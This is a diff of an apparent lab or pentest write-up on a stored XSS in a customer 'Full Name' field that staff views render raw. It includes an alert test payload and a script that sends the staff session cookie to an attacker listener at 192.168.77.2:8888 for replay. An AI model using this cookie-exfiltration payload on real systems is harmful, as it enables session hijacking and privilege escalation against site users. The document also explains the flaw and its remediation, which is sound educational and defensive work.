@@ -8,7 +8,7 @@
 
 ## Steps
 
-The customer **Full Name** field on **My Account** is stored and later rendered in views other users see. We first confirm it stores by saving a canary as the name:
+The customer **Full Name** field on **My Account** is stored and later rendered as live markup in views other users see. We first confirm it stores by saving a canary as the name:
 
 ```html
 <b>CANARY-STORED</b>
@@ -16,17 +16,23 @@ The customer **Full Name** field on **My Account** is stored and later rendered 
 
 <img width="735" height="537" alt="image" src="https://github.com/user-attachments/assets/d29fcddc-525a-4812-aea9-08991f996015" />
 
-The customer profile escapes the value (Blade `{{ }}`), but the staff **Customers** directory renders it raw (`{!! !!}`). Because the name also passes through a single-quoted SQL string on the way in, we use a quote-free payload that reads the session cookie and beacons it to our Kali listener:
+Next we confirm that the field is a true XSS sink, meaning that it actually is executed and not just store with a test payload that pops an alert showing the page origin:
 
 ```html
-<script>new Image().src="http://192.168.77.2:8888/?"+document.cookie</script>
+<img src=x onerror=alert(document.domain)>
 ```
 
 <img width="761" height="417" alt="image" src="https://github.com/user-attachments/assets/d4978ee5-6888-4b84-b951-57f39bdb14e9" />
 
-Saving the profile persists the payload:
+Loading the account renders the stored markup and fires the alert, showing `192.168.77.80`. So our input is being executed as a script:
 
 <img width="830" height="727" alt="image" src="https://github.com/user-attachments/assets/9e619cc0-a7bc-4056-8dc6-7e4dd6e356fc" />
+
+With execution confirmed, we swap the test payload for a weaponized one. The staff **Customers** directory (`/admin/customers`) renders the name raw (`{!! !!}`) and is viewed by a privileged session, so we set the name to a cookie-stealing beacon aimed at our Kali listener. Single quotes are avoided so the value survives the single-quoted SQL string on the way in:
+
+```html
+<script>new Image().src="http://192.168.77.2:8888/?"+document.cookie</script>
+```
 
 We start a listener on the Kali box:
 
@@ -59,8 +65,8 @@ The same request with a plain customer cookie is redirected to the login page, c
 A customer-controlled profile field executes JavaScript in a staff browser, and because
 `electra_session` is not flagged `HttpOnly`, that script reads and exfiltrates the staff
 session cookie. Replaying it grants full staff access with no staff password, escalating
-privilege from any customer account. The same stored value is harmless in the customer
-view and dangerous in the staff view, so output escaping must be applied at every render,
+privilege from any customer account. The same stored value is harmless where it is escaped
+and dangerous where it is rendered raw, so output escaping must be applied at every render,
 not only where the input originates.
 
 ## Remediation
